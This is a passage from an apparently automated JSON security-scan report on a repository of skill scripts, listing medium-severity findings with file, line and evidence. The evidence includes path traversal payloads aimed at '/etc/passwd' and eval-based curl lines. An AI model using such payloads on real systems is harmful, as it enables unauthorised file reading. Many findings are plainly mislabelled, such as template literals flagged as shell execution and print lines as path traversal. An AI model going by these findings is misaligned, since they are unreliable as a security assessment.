        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2779,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://auth_service/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2787,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://user_service/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/REFERENCE.md",
        "line_number": 2795,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://order_service/;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 449,
        "issue": "Backtick command execution",
        "evidence": "const url = `${this.baseUrl}${path}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": "headers['Authorization'] = `Bearer ${this.apiKey}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 467,
        "issue": "Backtick command execution",
        "evidence": "throw new Error(`HTTP ${response.status}: ${response.statusText}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 526,
        "issue": "Backtick command execution",
        "evidence": "code += '    if (params.toString()) path += `?${params.toString()}`;\\n'",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/scripts/validate_proto_schemas.py",
        "line_number": 666,
        "issue": "Path traversal pattern",
        "evidence": "suggestion=f\"Add 'option {option} = \\\"...\\\";'\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/resources/amqp-rabbitmq/scripts/analyze_message_flow.py",
        "line_number": 656,
        "issue": "Unencrypted HTTP",
        "evidence": "management_url = f\"http://{host}:15672\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/resources/amqp-rabbitmq/scripts/validate_rabbitmq_config.py",
        "line_number": 654,
        "issue": "Unencrypted HTTP",
        "evidence": "management_url = f\"http://{host}:15672\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation/resources/examples/python/server.py",
        "line_number": 23,
        "issue": "Path traversal pattern",
        "evidence": "# python -m grpc_tools.protoc -I../protos --python_out=. --grpc_python_out=. ../protos/service.proto",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation/resources/examples/python/client.py",
        "line_number": 17,
        "issue": "Path traversal pattern",
        "evidence": "# python -m grpc_tools.protoc -I../protos --python_out=. --grpc_python_out=. ../protos/service.proto",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/03-yubihsm-setup.py",
        "line_number": 43,
        "issue": "Privilege escalation",
        "evidence": "print(\"\\nStart connector with: sudo systemctl start yubihsm-connector\", file=sys.stderr)",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/02-aws-cloudhsm-integration.py",
        "line_number": 289,
        "issue": "Privilege escalation",
        "evidence": "print(\"2. Install: sudo yum install -y ./cloudhsm-client-*.rpm\", file=sys.stderr)",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/resources/hsm-integration/examples/02-aws-cloudhsm-integration.py",
        "line_number": 290,
        "issue": "Privilege escalation",
        "evidence": "print(\"3. Configure: sudo /opt/cloudhsm/bin/configure -a <cluster-ip>\", file=sys.stderr)",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management/resources/examples/python/acme_automation.py",
        "line_number": 195,
        "issue": "Unencrypted HTTP",
        "evidence": "print(f\"Make sure this is accessible at: http://{domain}/.well-known/acme-challenge/{challenge.token}\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cryptography/certificate-management/resources/scripts/renew_certificates.py",
        "line_number": 275,
        "issue": "Force flag usage",
        "evidence": "cmd.append('--force-renewal')",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
        "line_number": 26,
        "issue": "Unencrypted HTTP",
        "evidence": "- Sectigo: http://timestamp.sectigo.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
        "line_number": 410,
        "issue": "Unencrypted HTTP",
        "evidence": "print(\"  \u2022 Sectigo: http://timestamp.sectigo.com\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/examples/timestamp-authority-rfc3161.py",
        "line_number": 411,
        "issue": "Unencrypted HTTP",
        "evidence": "print(\"  \u2022 GlobalSign: http://timestamp.globalsign.com/tsa/r6advanced1\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/examples/hsm-pkcs11-signing.py",
        "line_number": 69,
        "issue": "User-controlled file path",
        "evidence": "self.session = self.token.open(user_pin=pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/scripts/sign_artifacts.py",
        "line_number": 24,
        "issue": "Unencrypted HTTP",
        "evidence": "sign_artifacts.py --file code.tar.gz --key key.pem --timestamp http://tsa.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/scripts/sign_artifacts.py",
        "line_number": 141,
        "issue": "User-controlled file path",
        "evidence": "self.pkcs11_session = slot.open(user_pin=self.hsm_pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification/resources/scripts/validate_signatures.py",
        "line_number": 359,
        "issue": "Unencrypted HTTP",
        "evidence": "ns = {'ds': 'http://www.w3.org/2000/09/xmldsig#'}",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/scripts/audit_signing_keys.py",
        "line_number": 629,
        "issue": "User-controlled file path",
        "evidence": "session = slot.open(user_pin=pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 78,
        "issue": "Path traversal pattern",
        "evidence": "\"../../../etc/passwd\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 80,
        "issue": "Path traversal pattern",
        "evidence": "\"....//....//....//etc/passwd\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 131,
        "issue": "Unencrypted HTTP",
        "evidence": "http_url = self.target.replace('https://', 'http://')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 146,
        "issue": "Unencrypted HTTP",
        "evidence": "hostname = self.target.replace('https://', '').replace('http://', '').split('/')[0]",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/security/security-headers/resources/scripts/check_headers.py",
        "line_number": 66,
        "issue": "Unencrypted HTTP",
        "evidence": "if not url.startswith(('http://', 'https://')):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 190,
        "issue": "Unencrypted HTTP",
        "evidence": "if stripped.startswith('ADD') and ('http://' in line or 'https://' in line):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 202,
        "issue": "Unencrypted HTTP",
        "evidence": "if 'http://' in line.lower() and 'sha' not in line.lower():",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 260,
        "issue": "Force flag usage",
        "evidence": "recommendation='Add: && npm cache clean --force'",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 318,
        "issue": "Unencrypted HTTP",
        "evidence": "if not ('http://' in line or 'https://' in line or '.tar' in line):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/observability/distributed-tracing/resources/scripts/visualize_trace.py",
        "line_number": 537,
        "issue": "Unencrypted HTTP",
        "evidence": "svg_parts.append(f'<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"{width}\" height=\"{height}\">')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/incident-response/resources/examples/integrations/slack-incident-bot.py",
        "line_number": 151,
        "issue": "Backtick command execution",
        "evidence": "\"text\": \":information_source: Use this channel for incident coordination only. Post updates in format: `[HH:MM] [@person] [ACTION/DECISION/OBSERVATION] Description`\"",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/resources/sre-practices/examples/chaos-scenario.py",
        "line_number": 359,
        "issue": "Unencrypted HTTP",
        "evidence": "service_url=\"http://api.example.com\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/resources/sre-practices/examples/chaos-scenario.py",
        "line_number": 360,
        "issue": "Unencrypted HTTP",
        "evidence": "dependency_url=\"http://auth.example.com\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/scripts/validate_alert_rules.py",
        "line_number": 287,
        "issue": "Unencrypted HTTP",
        "evidence": "if url and not url.startswith(('http://', 'https://')):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_production.py",
        "line_number": 26,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83d\ude80 Checking Production Readiness (Gate 4)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_foundation.py",
        "line_number": 26,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83c\udfd7\ufe0f  Checking Foundation Phase (Gate 2)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/holes_to_beads.py",
        "line_number": 94,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83d\udd04 Syncing holes to beads...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "3. Write characterization tests (see `tests/characterization/`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
        "line_number": 251,
        "issue": "Backtick command execution",
        "evidence": "5. Run `python scripts/next_hole.py` to see next resolvable holes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
        "line_number": 311,
        "issue": "Backtick command execution",
        "evidence": "print(\"\ud83c\udfaf Then: Run `python scripts/next_hole.py` to start resolution\")",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_discovery.py",
        "line_number": 25,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83d\udd0d Checking Discovery Phase (Gate 1)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/generate_report.py",
        "line_number": 147,
        "issue": "Backtick command execution",
        "evidence": "Run `radon cc -a src/` and `pytest --cov` for detailed metrics.",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/generate_report.py",
        "line_number": 199,
        "issue": "Backtick command execution",
        "evidence": "Run `pytest --cov=src --cov-report=html` for detailed coverage report.",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_implementation.py",
        "line_number": 26,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\u2699\ufe0f  Checking Implementation Phase (Gate 3)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/scripts/check_seo.py",
        "line_number": 163,
        "issue": "Unencrypted HTTP",
        "evidence": "if not canonical_url.startswith(('http://', 'https://')):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/scripts/generate_sitemap.py",
        "line_number": 203,
        "issue": "Unencrypted HTTP",
        "evidence": "urlset.set('xmlns', 'http://www.sitemaps.org/schemas/sitemap/0.9')",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/benchmark_operations.py",
        "line_number": 464,
        "issue": "Path traversal pattern",
        "evidence": "print(f\"Running benchmarks with {args.iterations} iterations...\\n\", file=sys.stderr)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/python/bank_account_aggregate.py",
        "line_number": 99,
        "issue": "User-controlled file path",
        "evidence": "def open(cls, account_id: str, owner: str, initial_deposit: Decimal, user_id: str) -> 'BankAccount':",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
        "line_number": 98,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
        "line_number": 192,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/examples/python/config-generator.py",
        "line_number": 339,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend_pool;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/proxies/nginx-configuration/resources/scripts/validate_config.py",
        "line_number": 343,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_passes = re.findall(r'proxy_pass\\s+http://(\\d+\\.\\d+\\.\\d+\\.\\d+)', content)",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 147,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 150,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 153,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 192,
        "issue": "Command substitution in shell",
        "evidence": "response=$(eval curl $curl_opts \"$url\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 197,
        "issue": "Command substitution in shell",
        "evidence": "body=$(echo \"$response\" | head -n -1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 198,
        "issue": "Command substitution in shell",
        "evidence": "status_code=$(echo \"$response\" | tail -n 1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 227,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /health \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 239,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users/1 \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 285,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request POST /api/users \"$data\" \"\" 201 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 291,
        "issue": "Command substitution in shell",
        "evidence": "CREATED_RESOURCE_ID=$(echo \"$response\" | jq -r '.id')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request PUT /api/users/$resource_id \"$data\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request PATCH /api/users/$resource_id \"$data\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request DELETE /api/users/$resource_id \"\" \"\" 204 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 346,
        "issue": "Command substitution in shell",
        "evidence": "elif response=$(make_request DELETE /api/users/$resource_id \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 359,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users/999999 \"\" \"\" 404 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 379,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request POST /api/users \"$data\" \"\" 400 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 381,
        "issue": "Command substitution in shell",
        "evidence": "elif response=$(make_request POST /api/users \"$data\" \"\" 422 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 394,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET \"/api/users?limit=10&offset=0\" \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET \"/api/users?status=active\" \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 424,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET \"/api/users?sort=created_at\" \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 436,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users \"\" \"-H 'Accept: application/json'\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 455,
        "issue": "Command substitution in shell",
        "evidence": "if ! response=$(make_request GET /api/users \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 461,
        "issue": "Command substitution in shell",
        "evidence": "count=$((count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 478,
        "issue": "Command substitution in shell",
        "evidence": "response1=$(curl -s -I \"${BASE_URL}/api/users\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 495,
        "issue": "Command substitution in shell",
        "evidence": "if ! response=$(make_request GET /api/users \"\" \"\" 401 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 509,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -s -I -X OPTIONS \"${BASE_URL}/api/users\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 150,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "invoke_output=$(eval \"$aws_cmd\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 157,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 158,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 166,
        "issue": "Command substitution in shell",
        "evidence": "local status_code=$(echo \"$invoke_output\" | jq -r '.StatusCode // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 167,
        "issue": "Command substitution in shell",
        "evidence": "local function_error=$(echo \"$invoke_output\" | jq -r '.FunctionError // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 168,
        "issue": "Command substitution in shell",
        "evidence": "local log_result=$(echo \"$invoke_output\" | jq -r '.LogResult // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "logs=$(echo \"$log_result\" | base64 --decode)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 179,
        "issue": "Command substitution in shell",
        "evidence": "response=$(cat \"$response_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 236,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(($(date +%s) + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 243,
        "issue": "Command substitution in shell",
        "evidence": "local tmp_dir=$(mktemp -d)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 247,
        "issue": "Command substitution in shell",
        "evidence": "while [[ $(date +%s) -lt $end_time ]]; do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
